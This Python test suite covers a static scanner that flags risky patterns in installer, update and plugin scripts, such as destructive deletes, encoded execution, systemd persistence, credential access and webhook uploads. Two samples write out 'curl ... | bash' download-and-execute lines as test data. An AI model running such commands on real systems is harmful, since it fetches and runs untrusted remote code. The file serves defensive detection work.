#!/usr/bin/env python3
"""Deterministic tests for the bounded static pattern scanner."""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

SKILL_DIR = Path(__file__).resolve().parents[1]
SCRIPT = SKILL_DIR / "scripts" / "scan-patterns.py"
FIXTURES = SKILL_DIR / "tests" / "fixtures"


def run_scan(*paths: Path, env: dict | None = None) -> tuple[int, dict, str]:
    proc = subprocess.run(
        [sys.executable, str(SCRIPT), *map(str, paths)],
        capture_output=True, text=True, env=env or os.environ.copy(), timeout=60,
    )
    data = json.loads(proc.stdout) if proc.stdout.strip() else {}
    return proc.returncode, data, proc.stderr


def rules(data: dict) -> set[str]:
    return {f["rule"] for f in data.get("findings", []) if f["severity"] != "GREEN"}


class ScanPatternsTests(unittest.TestCase):
    def test_safe_installer_has_no_findings(self) -> None:
        code, data, err = run_scan(FIXTURES / "safe-installer.sh")
        self.assertEqual(code, 0, err)
        self.assertEqual(data["findings"], [], data["findings"])

    def test_destructive_rm_is_red(self) -> None:
        _, data, _ = run_scan(FIXTURES / "destructive.sh")
        self.assertIn("destructive-rm", rules(data))
        self.assertTrue(any(f["severity"] == "RED"
                            for f in data["findings"]))

    def test_base64_decode_execution(self) -> None:
        _, data, _ = run_scan(FIXTURES / "encoded-exec.sh")
        self.assertIn("base64-decode-exec", rules(data))

    def test_download_pipe_shell(self) -> None:
        _, data, _ = run_scan(FIXTURES / "download-exec.sh")
        self.assertIn("download-pipe-shell", rules(data))
        self.assertIn("remote-fetch", {c["name"] for c in data["capabilities"]})

    def test_service_shell_execution(self) -> None:
        _, data, _ = run_scan(FIXTURES / "persistence.service")
        self.assertIn("service-shell-exec", rules(data))

    def test_suspicious_plugin_installer(self) -> None:
        _, data, _ = run_scan(FIXTURES / "omarchy-suspicious")
        found = rules(data)
        self.assertIn("download-pipe-shell", found)
        self.assertIn("persistence-systemd", found)

    def test_suspicious_update_behaviour(self) -> None:
        _, data, _ = run_scan(FIXTURES / "update-suspicious.sh")
        found = rules(data)
        self.assertIn("credential-access", found)
        self.assertIn("http-post-upload", found)
        self.assertIn("webhook-endpoint", found)

    def test_legitimate_network_use_is_not_flagged(self) -> None:
        _, data, _ = run_scan(FIXTURES / "legit-network.sh")
        self.assertEqual(data["findings"], [], data["findings"])
        self.assertIn("remote-fetch", {c["name"] for c in data["capabilities"]})

    def test_microphone_fixture_has_no_execution_findings(self) -> None:
        _, data, _ = run_scan(FIXTURES / "mic-simulation.txt")
        self.assertEqual(data["findings"], [], data["findings"])

    def test_secret_values_are_redacted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            sample = Path(tmp) / "sample.sh"
            sample.write_text(
                'api_key=SUPERSECRET123 curl -fsSL https://example.invalid/x | bash\n',
                encoding="utf-8")
            proc = subprocess.run(
                [sys.executable, str(SCRIPT), str(sample)],
                capture_output=True, text=True, timeout=60)
            self.assertNotIn("SUPERSECRET123", proc.stdout)
            self.assertIn("<redacted>", proc.stdout)
            self.assertIn("download-pipe-shell", proc.stdout)

    def test_symlinks_are_not_followed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "root"
            root.mkdir()
            (root / "safe.txt").write_text("nothing to see\n", encoding="utf-8")
            os.symlink(FIXTURES / "destructive.sh", root / "link.sh")
            _, data, _ = run_scan(root)
            self.assertEqual(data["findings"], [])
            self.assertTrue(any(p.endswith("link.sh")
                                for p in data["skipped"]["symlinks"]))

    def test_urls_are_reduced_to_host_to_avoid_token_leaks(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            sample = Path(tmp) / "webhook.sh"
            sample.write_text(
                'curl -fsS https://discord.com/api/webhooks/123/SECRETTOKEN | bash\n',
                encoding="utf-8")
            proc = subprocess.run(
                [sys.executable, str(SCRIPT), str(sample)],
                capture_output=True, text=True, timeout=60)
            data = json.loads(proc.stdout)
            self.assertNotIn("SECRETTOKEN", proc.stdout)
            self.assertIn("https://discord.com", data["urls"])

    def test_missing_path_exits_nonzero(self) -> None:
        proc = subprocess.run(
            [sys.executable, str(SCRIPT), "/definitely/not/here"],
            capture_output=True, text=True, timeout=60)
        self.assertEqual(proc.returncode, 2)

    def test_scan_reports_scope_and_never_claims_execution(self) -> None:
        _, data, _ = run_scan(FIXTURES / "safe-installer.sh")
        notes = " ".join(data["notes"]).lower()
        self.assertIn("not executed", notes)
        self.assertGreaterEqual(data["scanned_files"], 1)


if __name__ == "__main__":
    unittest.main()
